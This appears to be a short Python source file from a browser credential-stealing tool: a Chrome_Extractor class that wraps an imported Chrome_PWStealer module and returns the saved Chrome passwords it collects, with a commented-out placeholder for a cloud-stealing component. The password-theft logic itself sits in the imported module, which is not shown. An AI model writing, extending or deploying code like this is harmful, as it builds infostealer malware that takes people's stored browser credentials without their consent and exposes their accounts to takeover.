from .local.password_stealer import Chrome_PWStealer

class Chrome_Extractor:
    def __init__(self,temp_path=""):
        self.local_stealer = Chrome_PWStealer(temp_path)
        #self.cloud_staler = ..;
    def extract(self):
        local_pws = self.local_stealer.get_passwords()
        return local_pws